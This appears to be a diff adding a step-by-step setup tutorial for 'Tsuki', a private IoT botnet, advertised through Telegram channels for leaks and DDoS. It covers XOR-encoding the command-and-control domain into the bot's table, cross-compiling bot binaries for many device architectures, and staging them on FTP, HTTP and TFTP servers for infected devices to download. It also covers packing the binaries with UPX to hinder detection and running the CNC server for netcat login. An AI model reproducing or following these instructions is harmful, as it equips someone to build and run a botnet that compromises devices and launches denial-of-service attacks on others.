@@ -1,0 +1,154 @@
+HOW TO SETUP TSUKI (PRIVATE VERSION) >> Centos 7 TUT
+>> https://t.me/no0days
+>> https://t.me/leakddos
+
+=================================================
+FIRST UPDATE YOUR SYSTEM AND INSTALL EVERYTHING U NEED
+yum update -y ; yum upgrade -y
+yum groupinstall "Development Tools" -y
+yum install screen gcc libzip2 bzip2 httpd iptables wget golang -y
+=================================================
+INSTALL GOLANG
+wget https://storage.googleapis.com/golang/getgo/installer_linux
+chmod 777 ./installer_linux
+./installer_linux
+go mod init main
+go mod tidy
+=================================================
+EDIT IP'S FROM 0.0.0.0/0,0,0,0 TO YOUR VPS IP
+USE VISUAL CODE OPEN SOURCE FOLDER WITH VISUAL CODE CTRL + SHIFT + F AND REPLACE EVERYTHING
+
+=================================================
+gcc enc.c -o tsukicrypter
+go to your domain on cf put vps ip there and make it not proxied
+./tsukicrypter string domain.tsuki
+```
+./crypter string domain.tsuki
+XOR'ing 13 bytes of data...
+\x60\x6B\x69\x65\x6D\x6A\x2A\x70\x77\x71\x6F\x6D\x04
+```
+copy this data into your /bot/table.c
+add_entry(TABLE_CNC_DOMAIN, "\x60\x6B\x69\x65\x6D\x6A\x2A\x70\x77\x71\x6F\x6D\x04", 11); // domain goes here
+=================================================
+INSTALL CROSS COMPILERS
+```
+mkdir /etc/xcompile
+cd /etc/xcompile
+
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
+wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
+
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -jxf cross-compiler-x86_64.tar.bz2
+rm -rf *.tar.*
+mv cross-compiler-i586 i586
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-x86_64 x86_64
+```
+rm -rf ~/release
+rm -rf /var/lib/tftpboot
+rm -rf /var/lib/tftpboot
+rm -rf /var/lib/tftpboot
+=================================================
+Compileing the Bot
+mkdir /root/bins
+bash build.sh release
+bash build.sh debug
+=================================================
+Copying All Bins To html/tfp/tftpboot
+```
+cp -r bins/tsuki.arm   /var/ftp
+cp -r bins/tsuki.arm5   /var/ftp
+cp -r bins/tsuki.arm6   /var/ftp
+cp -r bins/tsuki.arm7   /var/ftp
+cp -r bins/tsuki.dbg  /var/ftp
+cp -r bins/tsuki.m68k   /var/ftp
+cp -r bins/tsuki.mips   /var/ftp
+cp -r bins/tsuki.mpsl   /var/ftp
+cp -r bins/tsuki.sh4   /var/ftp
+cp -r bins/tsuki.spc  /var/ftp
+cp -r bins/tsuki.x86  /var/ftp
+cp -r bins/tsuki.arm   /var/www/html
+cp -r bins/tsuki.arm5   /var/www/html
+cp -r bins/tsuki.arm6   /var/www/html
+cp -r bins/tsuki.arm7   /var/www/html
+cp -r bins/tsuki.dbg  /var/www/html
+cp -r bins/tsuki.m68k   /var/www/html
+cp -r bins/tsuki.mips   /var/www/html
+cp -r bins/tsuki.mpsl   /var/www/html
+cp -r bins/tsuki.sh4   /var/www/html
+cp -r bins/tsuki.spc  /var/www/html
+cp -r bins/tsuki.x86  /var/www/html
+cp -r bins/tsuki.arm   /var/lib/tftpboot
+cp -r bins/tsuki.arm5   /var/lib/tftpboot
+cp -r bins/tsuki.arm6   /var/lib/tftpboot
+cp -r bins/tsuki.arm7   /var/lib/tftpboot
+cp -r bins/tsuki.dbg  /var/lib/tftpboot
+cp -r bins/tsuki.m68k   /var/lib/tftpboot
+cp -r bins/tsuki.mips   /var/lib/tftpboot
+cp -r bins/tsuki.mpsl   /var/lib/tftpboot
+cp -r bins/tsuki.sh4   /var/lib/tftpboot
+cp -r bins/tsuki.spc  /var/lib/tftpboot
+cp -r bins/tsuki.x86  /var/lib/tftpboot
+```
+=================================================
+Packing Bins
+```
+wget https://github.com/upx/upx/releases/download/v3.95/upx-3.95-i386_linux.tar.xz
+unxz upx-3.95-i386_linux.tar.xz
+tar -xf upx-3.95-i386_linux.tar
+mv upx*/upx .
+./upx --ultra-brute /var/www/html/*
+./upx --ultra-brute /var/lib/tftpboot/*
+./upx --ultra-brute /var/ftp*
+rm -rf upx*
+```
+=================================================
+Compileing Listen and cnc
+```
+cd cnc
+go build listen.go
+gcc cnc.c -o controler -pthread
+```
+=================================================
+Screening Our cnc
+
+screen -S cnc ./cnc <bot-port> <cnc-port> <threads>
+screen -S cnc ./cnc 56744 9999 750
+
+connect via netcat / go to microsoft store install ubuntu
+command to connect : nc vpsip 9999
+=================================================
+i hope the setup steps simple for you my friend 
+if u have any problem or u want me to add/remove edit something contact me on telegram
+https://t.me/no0days
+hope you enjoy
